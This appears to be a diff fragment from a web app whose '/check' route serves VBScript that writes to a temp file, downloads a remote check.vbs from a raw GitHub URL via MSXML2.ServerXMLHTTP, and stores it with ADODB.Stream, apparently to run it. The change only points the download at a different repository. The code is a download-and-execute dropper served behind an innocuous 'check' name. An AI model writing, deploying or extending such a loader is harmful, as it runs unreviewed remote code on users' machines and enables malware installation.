@@ -14,7 +14,7 @@ app.get('/check', (req, res) => {
     tempFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\\c.vbs"
     
     Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    x.Open "GET", "https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs", False
+    x.Open "GET", "https://raw.githubusercontent.com/lozix64-bit/lozixloggeduahah/refs/heads/main/check.vbs", False
     x.Send
     
     Set s = CreateObject("ADODB.Stream")
